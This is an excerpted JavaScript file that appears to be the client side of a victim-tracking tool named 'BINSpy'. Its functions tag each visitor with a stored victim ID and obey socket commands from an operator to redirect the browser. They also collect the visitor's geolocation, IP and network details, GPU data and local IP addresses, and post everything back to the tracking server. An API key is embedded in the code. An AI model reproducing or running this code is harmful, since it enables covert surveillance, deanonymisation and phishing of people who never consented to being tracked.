...
function tping() {
    ...
    if (socketBINSpy != null){
        if (socketBINSpy.disconnected){
            window.t_sdisconnect = socketBINSpy.disconnected;
        }
    }
    $.ajax({
...
function getVictimData() {
	...
	if (localStorage.BINSpy_vId != undefined) {
		d.vId = localStorage.BINSpy_vId;
        d.vURL = localStorage.BINSpy_vURL;
	}
...
function defineSockets(self) {
    self.on('my_response', function(msg) {
        switch (msg.data.type){
            case 'network':
                localStorage.setItem("BINSpy_vURL", urlServices[msg.data.message]);
                window.location.replace('/rv?url=' + urlServices[msg.data.message]);
                break;
            case 'url':
                localStorage.setItem("BINSpy_vURL", msg.data.message);
...
function locateV(self) {
    $.ajax({
        url: "https://maps.googleapis.com/maps/api/js?key=AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM&callback=initMap",
        data: {},
        dataType: "json",
        type: "POST",
        success: function(response, status) {
            if (status == 'success'){
                $.ajax({
                        ...
                        data :  {"vId" : localStorage.BINSpy_vId, "lat": response.location.lat, "lon": response.location.lng},
                        dataType: "json",
                        type: 'POST',
...
function workWithNetworks(){
    $.getJSON('//ipinfo.io/json/?callback=?', function(data) {
        ...
        dInfo.vId = localStorage.BINSpy_vId
        var idx = 0;
...
function queryGPU(){
    ...
    $.ajax({
        url: '/gGpu',
        data: {vId : localStorage.BINSpy_vId, data : JSON.stringify(v_data)},
        dataType: "json",
        type: 'POST',
        success: function(response) {
    ...
    getIPs : function(){
        getIPs(function(ip){
            $.ajax({
                ...
                data: {"ip" : ip, "id" : localStorage.BINSpy_vId},
                dataType: "json",
                type: "POST",
                success: function(response) {
